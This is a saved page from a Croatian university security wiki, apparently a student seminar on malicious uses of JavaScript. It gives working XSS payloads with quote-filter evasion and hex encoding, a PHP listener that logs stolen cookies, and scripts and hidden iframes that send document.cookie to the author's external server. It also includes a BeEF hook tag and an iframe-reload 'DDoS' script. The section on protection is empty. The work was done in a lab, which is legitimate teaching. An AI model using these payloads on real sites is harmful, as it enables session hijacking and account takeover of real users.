+<p>Vidi se da se filtriraju navodnici, pa se javascript ne može izvršiti, tj. prije svakog navodnika umeće '\' (engl. backslah). Za zaobilažanje toga koristi se javascript funkcija String.fromCharCode() koja ASCII kod konvertira u tekst i ne trebaju se koristiti navodnici. Primjer alata koji obavlja tu funkciju: <a href="http://wocares.com/noquote.php" class="external free" rel="nofollow">http://wocares.com/noquote.php</a>
+</p><p>Ono što se želi ispisati dobiva ovakav oblik: String.fromCharCode(116,101,115,116)
+Skripta izgleda ovako:  
+</p>
+<pre>&lt;script&gt;alert(String.fromCharCode(116,101,115,116))&lt;/script&gt;
+</pre>
+<p>Da bi kod za korisnika izgledao još kompliciranije, napadač ga kodira heksadekadski. Primjer web alata za tu namjenu: <a href="http://www.maxi-pedia.com/ascii+to+hex+converter" class="external free" rel="nofollow">http://www.maxi-pedia.com/ascii+to+hex+converter</a> 
+</p><p>Izgled kodirana skripte:
+</p>
+<pre>%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%53%74%72%69%6E%67%2E%66%72%6F%6D%43%68%61%72%43%6F%64
+%65%28%31%31%36%2C%31%30%31%2C%31%31%35%2C%31%31%36%29%29%3C%2F%73%63%72%69%70%74%3E
+</pre>
+<p><br />
+</p>
+<h2> <span class="mw-headline" id="Za.C5.A1tita">Zaštita</span></h2>
+<p>Kako zaštititi vlastitu web stranicu od napada korištenjem Javascripta
+</p><p><br />
+</p>
+<h2> <span class="mw-headline" id="Prakti.C4.8Dni_dio">Praktični dio</span></h2>
+<p><i>Autor: Zvonimir Jurinić</i>
+</p><p><br />
+</p>
+<h3> <span class="mw-headline" id="Kra.C4.91a_cookieja_.28XSS_napadi.29">Krađa cookieja (XSS napadi)</span></h3>
+<p>Pomoću cookieja se ostvaruje korisnička autentifikacija na nekoj webstranici (serveru). Cilj je ukrasti cookie. Njegovim korištenjem jednostavno se zaobilazi  proces legitimne autentifikacije; i napadač je prijavljen u kao da se u sustav prijavio legitimni korisnik (čiji je cookie ukraden).
+	Prvi korak je pronalaženje ranjive web stanice. Za potrebe projekta koristila se OWASP Broken Web Applications Project, pokrenuta na virtualki. Najjednostavniji način provjere XSS-a na stvarnom webu jest da na bilo kojoj webstranici sa input poljima probamo izvršiti neku skriptu (nrp. tražilice na stranici, mailing liste, ...). U input polje se upiše jednostavni javascript kod: &lt;script&gt;alert(1)&lt;/script&gt;
+	Drugi korak je kreiranje jednostavne php skripte koja sprema proslijeđene cookieje. Skriptu je potrebno postaviti na neki server. Za potrebe projekte koristio sam server arka.foi.hr, a skriptu sam nazvao listener.php
+</p><p><br />
+listener.php: 
+</p>
+<pre>&lt;?php
+$cookie=$_GET['c'];
+$ip=getenv('REMOTE_ADDR');//$_SERVER["REMOTE_ADDR"]
+$port=$_SERVER['REMOTE_PORT'];
+$date=date("j F, Y, g:i a");
+$referer=getenv("HTTP_REFERER");
+$fp = fopen('cookies.html','a');
+fwrite($fp, "Cookie: $cookie <br /> IP: $ip <br /> port: $port <br /> Date and time: $date <br /> referer: $referer");
+fclose($fp);
+header("Location:<a href="http://192.168.56.101/dvwa/vulnerabilities/xss_r/" class="external free" rel="nofollow">http://192.168.56.101/dvwa/vulnerabilities/xss_r/</a>");
+?&gt;
+</pre>
+<p>Treći korak je kreiranje malicioznog javascripta kojeg onda moramo uvaliti žrtvi i ona ga mora pokrenuti. 
+maliciozni javascript koji krade cookie:
+</p>
+<pre>&lt;script&gt;document.location="<a href="http://arka.foi.hr/~zvjurinic/listener.php?c=" class="external free" rel="nofollow">http://arka.foi.hr/~zvjurinic/listener.php?c=</a>" +document.cookie &lt;/script&gt;
+</pre>
+<p>Cjeloviti link koji šaljemo korisniku:
+</p>
+<pre><a href="http://192.168.56.101/dvwa/vulnerabilities/xss_r/?name=" class="external free" rel="nofollow">http://192.168.56.101/dvwa/vulnerabilities/xss_r/?name=</a> + prije spomenti javascript
+</pre>
+<p>Link na datoteku s cookiejima:
+</p>
+<pre><a href="http://arka.foi.hr/~zvjurinic/cookies.txt" class="external free" rel="nofollow">http://arka.foi.hr/~zvjurinic/cookies.txt</a>
+</pre>
+<p>Nakon što imamo cookie, koristi se alat <a href="https://addons.mozilla.org/en-us/firefox/addon/tamper-data/" class="external text" rel="nofollow">Tamper Data</a>, tako da se u polje cookie kopira vrijednost cookieja i (ja kao napadač) prijavljen sam u sustav kao legitimni korisnik. 
+</p><p>Opisani postupak je primjer neperzistetnog  XSS-a. Ako bi želio pokazati perzistentni napad, onda bi prijašnji maliciozni javascript kopirao u &lt;ref name="Owasp" /&gt; GuestBook .
+</p><p>Također se koristi i engl. frame (Inline frames)koji omogućava otvaranje drugog linka unutar postojeće stranice ovisno o definiranim atributima. Ta druga stranica može biti veličine 1 pixel, pa je praktički neće ni primijetiti. Iframe može uključivati razne stranice sa malwareom.
+	Kod prijašnjih napada koristi nakon izvršavanja javascripta koristi se preusmjeravanje na neku drugu stranicu. To baca sumnju da se nešto dešava u pozadini. Ako se koristi iframe onda nema preusmjeravanja.
+</p>
+<pre>&lt;iframe width=0 height=0 src=javascript: void(document.location="<a href="http://arka.foi.hr/~zvjurinic/listener.php?c=" class="external free" rel="nofollow">http://arka.foi.hr/~zvjurinic/listener.php?c=</a>"+document.cookie)&gt;&lt;/iframe&gt;
+</pre>
+<pre>var ifr = document.createElement("iframe");
+ifr.src = "<a href="http://arka.foi.hr/~zvjurinic/listener.php?c=" class="external free" rel="nofollow">http://arka.foi.hr/~zvjurinic/listener.php?c=</a>" + document.cookie;
+ifr.visibility = "hidden"
+document.body.appendChild(ifr);
+</pre>
+<p>Ovaj dio koda stavlja skriveni iframe na stranicu i loada skriptu za spremanje cookieja. Da bi ga korisnik pokrenuo treba napraviti engl. script source tag:
+</p>
+<pre>&lt;script src="<a href="http://arka.foi.hr/~zvjurinic/iframer.js" class="external free" rel="nofollow">http://arka.foi.hr/~zvjurinic/iframer.js</a>"&gt;&lt;/script&gt;
+</pre>
+<h3> <span class="mw-headline" id="XSS_shell">XSS shell</span></h3>
+<p>Može se reči da je to kao neki tunel za engl. XSS backdoor i engl. zombie manager. Ima jako puno moćnih mogućnosti glede hakiranja. Poanta je da napadač ubaci žrtvi jedan specijalni javascript file koji održava u pozadini otvorenu konekciju s serverom napadača i čeka na naredbu. Dalje onda žrtvi može ubaciti bilo kakvi javascript ili izvršiti naredbu.
+	Da bi ga postavili prvo moramo koristiti BackTrack. Koristio sam BackTrack5r3 . Trebamo instalirati neki XSS shell, konkretno koristio sam BeEF (The Browser Exploitation Framework). Više o  BeEF-u ovom linku:  <a href="https://github.com/beefproject/beef/wiki" class="external free" rel="nofollow">https://github.com/beefproject/beef/wiki</a>.
+</p><p><a href="http://security.foi.hr/wiki/index.php/Datoteka:Beef.jpg" class="image"><img alt="Beef.jpg" src="../images/6/63/Beef.jpg" width="651" height="463" /></a>
+</p><p>Nakon pokretanja servera dobije ovakav zaslon. Bitne su nam dvije linije koda Hook URL i UI URL. Prvi se šalje korisniku, druga je za web sučelje. Nakon autentifikacije vidimo Control Panel  XSS shell server. Zatim treba još umetnuti javascript za korisnika. Taj javascript file će dalje odraditi cijeli posao.
+</p>
+<pre>&lt;script src="10.0.2.15:3000/hook.js"&gt;&lt;/script&gt;
+</pre>
+<p>Nakon što se u browseru korisnika pokrenuo Javascript, vidimo ga prikazanog pod Hooked Browsers. Ako se klikne na njega vide se Detalji browsera, tj. razne osnovne informacije. Pravi pontencijal Beef-a skriva se u Tabu engl. Commands. Stvarno ima puno naredbi koje se mogu onda izvršavati u korisničkom browseru bez da je on toga svjestan. Nisam ih isprobaval jer to malo izlazi van iz granica teme seminara. Slijedeća slika prikazuje cijelo stablo naredbi
+</p><p><a href="http://security.foi.hr/wiki/index.php/Datoteka:Bef1.jpg" class="image"><img alt="Bef1.jpg" src="../images/0/05/Bef1.jpg" width="791" height="411" /></a>
+</p>
+<h3> <span class="mw-headline" id="Javascript_Botnet">Javascript Botnet</span></h3>
+<p>Ideja Javascript Botneta je slijedeća: Imamo računalo, na njemu instaliran BackTrack. To računalo se ponaša kao server. Na njemu se instalira proxy i registrira se, da se koristi kao proxy server. Kako promet ide preko tog računala, u svaki javascript doda se još jedan maliciozni dio, koji se izvrši u korisnikovom browseru, tj. instalira drugi maliciozni javascript pomoću kojeg se napravi backdoor. Za kontrolu nad svim zaraženim računalima koristi se neki framework za to. Primjer je već prije spomenuti BeEF. 
+Ovo je samo ideja i detaljnije o tome ima na slijedećem linku:<a href="http://www.google.hr/url?sa=t&amp;rct=j&amp;q=&amp;esrc=s&amp;source=web&amp;cd=2&amp;cad=rja&amp;ved=0CDgQFjAB&amp;url=http%3A%2F%2Fmedia.blackhat.com%2Fbh-us-12%2FBriefings%2FAlonso%2FBH_US_12_Alonso_Owning_Bad_Guys_WP.pdf&amp;ei=RnP8UP6wFcrm4QSJ-4DAAg&amp;usg=AFQjCNGpmpQbcg7TGnfCXv0doG_rQbx0Ig&amp;sig2=lfy4AjfUTmXJbRaQ6gQpNQ&amp;bvm=bv.41248874,d.bGE" class="external text" rel="nofollow">Javascript Botnet</a>
+</p>
+<h3> <span class="mw-headline" id="DDos_Javascript">DDos Javascript</span></h3>
+<pre>&lt;html&gt;
+&lt;head&gt;
+&lt;script&gt;
+function exploit(){
+var iframe = document.getElementById("the_iframe");
+iframe.onload=exploit;
+for(var n=0; n&lt;10; n++){
+</pre>
+<p>		iframe.src = "www.google.hr";
+	}
+	}
+</p>
+<pre>&lt;/script&gt;
+&lt;/head&gt;
+&lt;body onmousemove="exploit();"&gt;
+&lt;iframe width="80%" height="50%" id="the_iframe" src="<a href="http://free-ck.t-com.hr/dvdmackovec/" class="external free" rel="nofollow">http://free-ck.t-com.hr/dvdmackovec/</a>"   frameborder="1"&gt;&lt;/iframe&gt;
+test
+&lt;/body&gt;
+&lt;/html&gt;--&gt;
+</pre>
+<h2> <span class="mw-headline" id="Literatura">Literatura</span></h2>
+<p><b>Knjige:</b>
+</p><p><br />
+<b>Internet izvori:</b>
+</p><p><a href="http://www.cis.hr/www.edicija/LinkedDocuments/CCERT-PUBDOC-2007-10-206.pdf" class="external free" rel="nofollow">http://www.cis.hr/www.edicija/LinkedDocuments/CCERT-PUBDOC-2007-10-206.pdf</a> (dostupno 17.01.2013.)
+</p><p><a href="http://www.veracode.com/security/xss" class="external free" rel="nofollow">http://www.veracode.com/security/xss</a> (dostupno 18.01.2013.)
+</p><p><a href="http://os2.zemris.fer.hr/ns/malware/2007_klaric/css.html" class="external free" rel="nofollow">http://os2.zemris.fer.hr/ns/malware/2007_klaric/css.html</a> (dostupno: 18.01.2013.)
+</p><p><a href="http://www.cert.hr/sites/default/files/CCERT-PUBDOC-2005-01-106.pdf" class="external free" rel="nofollow">http://www.cert.hr/sites/default/files/CCERT-PUBDOC-2005-01-106.pdf</a>
+</p><p><a href="http://www.cert.hr/sites/default/files/NCERT-PUBDOC-2011-02-323.pdf" class="external free" rel="nofollow">http://www.cert.hr/sites/default/files/NCERT-PUBDOC-2011-02-323.pdf</a>
+</p><p><a href="http://www.cert.hr/sites/default/files/CCERT-PUBDOC-2006-05-157.pdf" class="external free" rel="nofollow">http://www.cert.hr/sites/default/files/CCERT-PUBDOC-2006-05-157.pdf</a>
+</p><p><a href="http://www.go4expert.com/forums/showthread.php?t=17066" class="external free" rel="nofollow">http://www.go4expert.com/forums/showthread.php?t=17066</a>
+</p><p><a href="http://www.cert.hr/sites/default/files/KAKO-NAPRAVITI-SIGURNU-APLIKACIJU.pdf" class="external free" rel="nofollow">http://www.cert.hr/sites/default/files/KAKO-NAPRAVITI-SIGURNU-APLIKACIJU.pdf</a>
+</p><p><a href="http://beefproject.com/" class="external free" rel="nofollow">http://beefproject.com/</a>
+</p>
+<!-- 
+NewPP limit report
+Preprocessor node count: 71/1000000
+Post-expand include size: 0/2097152 bytes
+Template argument size: 0/2097152 bytes
+Expensive parser function count: 0/100
+-->
+
+<!-- Saved in parser cache with key sisds:pcache:idhash:4380-0!*!0!!hr!2!edit=0 and timestamp 20190203204046 -->
+<div class="printfooter">
+Dobavljeno iz "<a href="Korištenje_Javascripta_u_maliciozne_svrhe.html">http://security.foi.hr/wiki/index.php/Kori%C5%A1tenje_Javascripta_u_maliciozne_svrhe</a>"</div>
+				<!-- /bodytext -->
+								<!-- catlinks -->
+				<div id='catlinks' class='catlinks catlinks-allhidden'></div>				<!-- /catlinks -->
+												<div class="visualClear"></div>
+			</div>
+			<!-- /bodyContent -->
+		</div>
+		<!-- /content -->
+		<!-- header -->
+		<div id="mw-head" class="noprint">
+			
+<!-- 0 -->
+<div id="p-personal" class="">
+	<h5>Osobni alati</h5>
+	<ul>
+					<li  id="pt-login"><a href="http://security.foi.hr/wiki/index.php?title=Posebno:Prijava&amp;returnto=Kori%C5%A1tenje_Javascripta_u_maliciozne_svrhe" title="Predlažemo Vam da se prijavite, ali nije obvezno. [o]" accesskey="o">Prijavi se</a></li>
+			</ul>
+</div>
+
+<!-- /0 -->
+			<div id="left-navigation">
+				
+<!-- 0 -->
+<div id="p-namespaces" class="vectorTabs">
+	<h5>Imenski prostori</h5>
+	<ul>
+					<li  id="ca-nstab-main" class="selected"><span><a href="Korištenje_Javascripta_u_maliciozne_svrhe.html"  title="Pogledaj sadržaj [c]" accesskey="c">Članak</a></span></li>
+					<li  id="ca-talk" class="new"><span><a href="http://security.foi.hr/wiki/index.php?title=Razgovor:Kori%C5%A1tenje_Javascripta_u_maliciozne_svrhe&amp;action=edit&amp;redlink=1"  title="Razgovor o stranici [t]" accesskey="t">Razgovor</a></span></li>
+			</ul>
+</div>
+
+<!-- /0 -->
+
+<!-- 1 -->
+<div id="p-variants" class="vectorMenu emptyPortlet">
+		<h5><span>Inačice</span><a href="Korištenje_Javascripta_u_maliciozne_svrhe.html#"></a></h5>
+	<div class="menu">
+		<ul>
+					</ul>
+	</div>
+</div>
+
+<!-- /1 -->
+			</div>
+			<div id="right-navigation">
+				
+<!-- 0 -->
+<div id="p-views" class="vectorTabs">
+	<h5>Pogledi</h5>
+	<ul>
+					<li id="ca-view" class="selected"><span><a href="Korištenje_Javascripta_u_maliciozne_svrhe.html" >Čitaj</a></span></li>
+					<li id="ca-viewsource"><span><a href="http://security.foi.hr/wiki/index.php?title=Kori%C5%A1tenje_Javascripta_u_maliciozne_svrhe&amp;action=edit"  title="Ova stranica je zaštićena. Možete pogledati izvorni kod. [e]" accesskey="e">Vidi izvor</a></span></li>
+					<li id="ca-history" class="collapsible "><span><a href="http://security.foi.hr/wiki/index.php?title=Kori%C5%A1tenje_Javascripta_u_maliciozne_svrhe&amp;action=history"  title="Ranije izmjene na ovoj stranici. [h]" accesskey="h">Vidi stare izmjene</a></span></li>
+			</ul>
+</div>
+
+<!-- /0 -->
+
+<!-- 1 -->
+<div id="p-cactions" class="vectorMenu emptyPortlet">
+	<h5><span>Radnje</span><a href="Korištenje_Javascripta_u_maliciozne_svrhe.html#"></a></h5>
+	<div class="menu">
+		<ul>
+					</ul>
+	</div>
+</div>
+
+<!-- /1 -->
+
+<!-- 2 -->
+<div id="p-search">
+	<h5><label for="searchInput">Traži</label></h5>
+	<form action="http://security.foi.hr/wiki/index.php" id="searchform">
+		<input type='hidden' name="title" value="Posebno:Traži"/>
+				<input id="searchInput" name="search" type="text"  title="Pretraži ovaj wiki [f]" accesskey="f"  value="" />
+		<input type='submit' name="go" class="searchButton" id="searchGoButton"	value="Kreni" title="Idi na stranicu s ovim imenom ako ona postoji" />
+		<input type="submit" name="fulltext" class="searchButton" id="mw-searchButton" value="Traži" title="Traži ovaj tekst na svim stranicama" />
+			</form>
+</div>
+
+<!-- /2 -->
+			</div>
+		</div>
+		<!-- /header -->
+		<!-- panel -->
+			<div id="mw-panel" class="noprint">
+				<!-- logo -->
+					<div id="p-logo"><a style="background-image: url(../../images/osslogo.png);" href="../../wiki.html"  title="Glavna stranica"></a></div>
+				<!-- /logo -->
+				
+<!-- navigation -->
+<div class="portal" id='p-navigation'>
+	<h5>Orijentacija</h5>
+	<div class="body">
+				<ul>
+					<li id="n-mainpage-description"><a href="../../wiki.html" title="Posjeti glavnu stranicu [z]" accesskey="z">Glavna stranica</a></li>
+					<li id="n-portal"><a href="http://security.foi.hr/wiki/index.php/SIS_Wiki:Portal_zajednice" title="O projektu, što možete učiniti, gdje je što">Portal zajednice</a></li>
+					<li id="n-currentevents"><a href="http://security.foi.hr/wiki/index.php/SIS_Wiki:Novosti" title="O trenutačnim događajima">Aktualno</a></li>
+					<li id="n-recentchanges"><a href="./Posebno:Nedavne_promjene.html" title="Popis nedavnih promjena u wikiju. [r]" accesskey="r">Nedavne promjene</a></li>
+					<li id="n-randompage"><a href="./Posebno:Slučajna_stranica.html" title="Učitaj slučajnu stranicu [x]" accesskey="x">Slučajna stranica</a></li>
+					<li id="n-help"><a href="./Pomoć:Pomoć.html" title="Mjesto za pomoć suradnicima.">Pomoć</a></li>
+				</ul>
+			</div>
+</div>
+
+<!-- /navigation -->
+
+<!-- SEARCH -->
+
+<!-- /SEARCH -->
+
+<!-- TOOLBOX -->
+<div class="portal" id="p-tb">
+	<h5>Traka s alatima</h5>
+	<div class="body">
+		<ul>
+					<li id="t-whatlinkshere"><a href="http://security.foi.hr/wiki/index.php/Posebno:%C5%A0to_vodi_ovamo/Kori%C5%A1tenje_Javascripta_u_maliciozne_svrhe" title="Popis svih stranica koje sadrže poveznice ovamo [j]" accesskey="j">Što vodi ovamo</a></li>
+						<li id="t-recentchangeslinked"><a href="http://security.foi.hr/wiki/index.php/Posebno:Povezane_promjene/Kori%C5%A1tenje_Javascripta_u_maliciozne_svrhe" title="Nedavne promjene na stranicama na koje vode ovdašnje poveznice [k]" accesskey="k">Povezane stranice</a></li>
+																																										<li id="t-specialpages"><a href="./Posebno:Posebne_stranice.html" title="Popis posebnih stranica [q]" accesskey="q">Posebne stranice</a></li>
+									<li id="t-print"><a href="http://security.foi.hr/wiki/index.php?title=Kori%C5%A1tenje_Javascripta_u_maliciozne_svrhe&amp;printable=yes" rel="alternate" title="Verzija za ispis ove stranice [p]" accesskey="p">Verzija za ispis</a></li>
+						<li id="t-permalink"><a href="http://security.foi.hr/wiki/index.php?title=Kori%C5%A1tenje_Javascripta_u_maliciozne_svrhe&amp;oldid=17368" title="Trajna poveznica na ovu verziju stranice">Trajna poveznica</a></li>
+						</ul>
+	</div>
+</div>
+
+<!-- /TOOLBOX -->
+
+<!-- LANGUAGES -->
+
+<!-- /LANGUAGES -->
+			</div>
+		<!-- /panel -->
+		<!-- footer -->
+		<div id="footer">
+											<ul id="footer-info">
+																	<li id="footer-info-lastmod"> Datum zadnje promjene na ovoj stranici: 11:20, 28. siječnja 2013.</li>
+																							<li id="footer-info-viewcount">Ova stranica je pogledana 8.499 puta.</li>
+																							<li id="footer-info-copyright">Sadržaji se koriste u skladu s <a href="http://creativecommons.org/licenses/by-sa/3.0/" class="external ">Creative Commons Attribution Share Alike</a>.</li>
+															</ul>
+															<ul id="footer-places">
+																	<li id="footer-places-privacy"><a href="http://security.foi.hr/wiki/index.php/SIS_Wiki:Za%C5%A1tita_privatnosti" title="SIS Wiki:Zaštita privatnosti">Zaštita privatnosti</a></li>
+																							<li id="footer-places-about"><a href="./SIS_Wiki:O_projektu_SIS_Wiki.html" title="SIS Wiki:O projektu SIS Wiki">O projektu SIS Wiki</a></li>
+																							<li id="footer-places-disclaimer"><a href="http://security.foi.hr/wiki/index.php/SIS_Wiki:General_disclaimer" title="SIS Wiki:General disclaimer">Odricanje od odgovornosti</a></li>
+															</ul>
+											<ul id="footer-icons" class="noprint">
+					<li id="footer-copyrightico">
+						<a href="http://creativecommons.org/licenses/by-sa/3.0/"><img src="../skins/common/images/cc-by-sa.png" alt="Creative Commons Attribution Share Alike" width="88" height="31" /></a>
+					</li>
+					<li id="footer-poweredbyico">
+						<a href="http://www.mediawiki.org/"><img src="../skins/common/images/poweredby_mediawiki_88x31.png" alt="Powered by MediaWiki" width="88" height="31" /></a>
+					</li>
+				</ul>
+						<div style="clear:both"></div>
+		</div>
+		<!-- /footer -->
+		
+<script src="../load.php%3Fdebug=false&amp;lang=hr&amp;modules=startup&amp;only=scripts&amp;skin=vector&amp;*"></script>
+<script>if ( window.mediaWiki ) {
+	mediaWiki.config.set({"wgCanonicalNamespace": "", "wgCanonicalSpecialPageName": false, "wgNamespaceNumber": 0, "wgPageName": "Korištenje_Javascripta_u_maliciozne_svrhe", "wgTitle": "Korištenje Javascripta u maliciozne svrhe", "wgAction": "view", "wgArticleId": 4380, "wgIsArticle": true, "wgUserName": null, "wgUserGroups": ["*"], "wgCurRevisionId": 17368, "wgCategories": [], "wgBreakFrames": false, "wgRestrictionEdit": [], "wgRestrictionMove": []});
+}
+</script>
+<script>if ( window.mediaWiki ) {
+	mediaWiki.loader.load(["mediawiki.util", "mediawiki.legacy.wikibits", "mediawiki.legacy.ajax"]);
+	mediaWiki.loader.go();
+}
+</script>
+
+<script>if ( window.mediaWiki ) {
+	mediaWiki.user.options.set({"ccmeonemails":0,"cols":80,"contextchars":50,"contextlines":5,"date":"default","diffonly":0,"disablemail":0,"disablesuggest":0,"editfont":"default","editondblclick":0,"editsection":1,"editsectiononrightclick":0,"enotifminoredits":0,"enotifrevealaddr":0,"enotifusertalkpages":1,"enotifwatchlistpages":0,"extendwatchlist":0,"externaldiff":0,"externaleditor":0,"fancysig":0,"forceeditsummary":0,"gender":"unknown","hideminor":0,"hidepatrolled":0,"highlightbroken":1,"imagesize":2,"justify":0,"math":1,"minordefault":0,"newpageshidepatrolled":0,"nocache":0,"noconvertlink":0,"norollbackdiff":0,"numberheadings":0,"previewonfirst":0,"previewontop":1,"quickbar":1,"rcdays":7,"rclimit":50,"rememberpassword":0,"rows":25,"searchlimit":20,"showhiddencats":0,"showjumplinks":1,"shownumberswatching":1,"showtoc":1,"showtoolbar":1,"skin":"vector","stubthreshold":0,"thumbsize":2,"underline":2,"uselivepreview":0,"usenewrc":0,"watchcreations":0,"watchdefault":0,"watchdeletion":0,
+	"watchlistdays":3,"watchlisthideanons":0,"watchlisthidebots":0,"watchlisthideliu":0,"watchlisthideminor":0,"watchlisthideown":0,"watchlisthidepatrolled":0,"watchmoves":0,"wllimit":250,"variant":"hr","language":"hr","searchNs0":true,"searchNs1":false,"searchNs2":false,"searchNs3":false,"searchNs4":false,"searchNs5":false,"searchNs6":false,"searchNs7":false,"searchNs8":false,"searchNs9":false,"searchNs10":false,"searchNs11":false,"searchNs12":false,"searchNs13":false,"searchNs14":false,"searchNs15":false});;mediaWiki.loader.state({"user.options":"ready"});
+}
+</script>		<!-- fixalpha -->
+		<script type="text/javascript"> if ( window.isMSIE55 ) fixalpha(); </script>
+		<!-- /fixalpha -->
+		<!-- Served in 0.386 secs. -->			</body>
+</html>
